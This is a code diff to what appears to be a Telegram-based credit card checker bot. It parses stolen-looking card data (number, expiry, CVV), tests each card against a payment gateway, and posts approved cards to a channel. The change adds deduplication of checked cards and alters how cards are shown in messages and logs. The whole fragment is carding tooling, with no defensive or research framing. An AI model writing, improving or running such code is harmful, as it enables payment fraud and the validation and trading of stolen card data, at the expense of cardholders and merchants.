@@ -61,6 +61,10 @@ async def ppc(client, cc_data, post_result=True):
     try:
         cc, mon, year, cvv = cc_data.split("|")
         year = year[-2:]
+        normalized_cc = f"{cc}|{mon}|{year}|{cvv}"
+        if normalized_cc in checked_ccs:
+            return
+        checked_ccs.add(normalized_cc)
     except:
         return
 
@@ -124,7 +128,7 @@ async def ppc(client, cc_data, post_result=True):
             msg = f"""
 ✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝
 
-𝗖𝗮𝗿𝗱: {cc_data}
+𝗖𝗮𝗿𝗱: {normalized_cc}
 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {GATEWAY_NAME}
 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Approved
 
@@ -133,7 +137,7 @@ async def ppc(client, cc_data, post_result=True):
             if post_result:
                 try:
                     await client.send_message(CHANNEL_USERNAME, msg)
-                    print(f"[✅] Sent: {cc_data}")
+                    print(f"[✅] Sent: {normalized_cc}")
                 except Exception as e:
                     print(f"[❌] Failed to post: {e}")
 
@@ -141,7 +145,6 @@ async def worker(queue, client):
     while True:
         cc, is_txt = await queue.get()
         if cc not in checked_ccs:
-            checked_ccs.add(cc)
             if is_txt:
                 await checker_txt(client, cc)
             else:
